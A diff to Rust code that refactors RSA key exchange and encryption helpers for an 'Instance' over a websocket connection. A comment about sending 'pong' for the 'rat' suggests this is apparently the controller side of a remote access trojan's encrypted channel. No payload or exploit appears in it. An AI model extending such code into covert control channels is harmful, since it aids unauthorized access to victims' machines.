@@ -78,7 +78,7 @@ impl Instance {
         //make this encrypt every time when message sent
         self.write.send(Message::from(message)).await.unwrap();
     }
-    pub async fn generate_keys(&mut self) -> (String, String) {
+    pub async fn init_keys(&mut self) -> (String, String) {
         //Send pong for rat to generate a public key
         self.send_message("pong").await;
 
@@ -96,16 +96,8 @@ impl Instance {
             self.set_public_key(RsaPublicKey::from_pkcs1_pem(public_key.as_str()).unwrap());
             self.set_private_key(private_key.to_owned());
 
-            println!(
-                "{}",
-                self.public_key
-                    .clone()
-                    .unwrap()
-                    .to_pkcs1_pem(rsa::pkcs8::LineEnding::LF)
-                    .unwrap()
-            );
             //Send my public key encrypted by users public key to user and forget about it
-            let encrypted_key = &self.encrypt(
+            let encrypted_key = &self.encrypt_my_key(
                 &self.public_key.clone().unwrap(),
                 private_key
                     .to_public_key()
@@ -113,6 +105,7 @@ impl Instance {
                     .unwrap()
                     .as_bytes(),
             );
+            //Split encrypted key, encode it in hex and send back
             for index in 0..2 {
                 if index == 0 {
                     self.write
@@ -127,24 +120,46 @@ impl Instance {
                 }
             }
         }
-
+        println!("rsa init sequence with complete");
         (public_key, private_key_string)
     }
+
     fn generate_private_key(&self) -> RsaPrivateKey {
         let mut rng = rand::thread_rng();
         let bits = 2048;
         RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key")
     }
-    fn encrypt(&self, public_key: &RsaPublicKey, data_to_enc: &[u8]) -> (Vec<u8>, Vec<u8>) {
-        let mut rng = rand::thread_rng();
+
+    fn encrypt_my_key(&self, public_key: &RsaPublicKey, data_to_enc: &[u8]) -> (Vec<u8>, Vec<u8>) {
         let mid = data_to_enc.len() / 2;
         (
-            public_key
-                .encrypt(&mut rng, Pkcs1v15Encrypt, &data_to_enc[..mid])
-                .expect("failed to encrypt"),
-            public_key
-                .encrypt(&mut rng, Pkcs1v15Encrypt, &data_to_enc[mid..])
-                .expect("failed to encrypt"),
+            self.encrypt_data(Some(public_key), &data_to_enc[..mid]),
+            self.encrypt_data(Some(public_key), &data_to_enc[mid..]),
         )
+    }
+    pub fn encrypt_data(&self, public_key: Option<&RsaPublicKey>, data_to_enc: &[u8]) -> Vec<u8> {
+        let mut rng = rand::thread_rng();
+        //Yes this is neccessary if we need to use different public key
+        match public_key {
+            Some(public_key) => public_key
+                .clone()
+                .encrypt(&mut rng, Pkcs1v15Encrypt, data_to_enc)
+                .expect("failed to encrypt"),
+            None => self
+                .public_key
+                .clone()
+                .unwrap()
+                .encrypt(&mut rng, Pkcs1v15Encrypt, data_to_enc)
+                .expect("failed to encrypt"),
+        }
+    }
+    pub fn decrypt_data(&self, data_to_decrypt: &[u8]) -> String {
+        let decrypted_data = self
+            .private_key
+            .clone()
+            .unwrap()
+            .decrypt(Pkcs1v15Encrypt, data_to_decrypt)
+            .unwrap();
+        String::from_utf8(decrypted_data).unwrap()
     }
 }
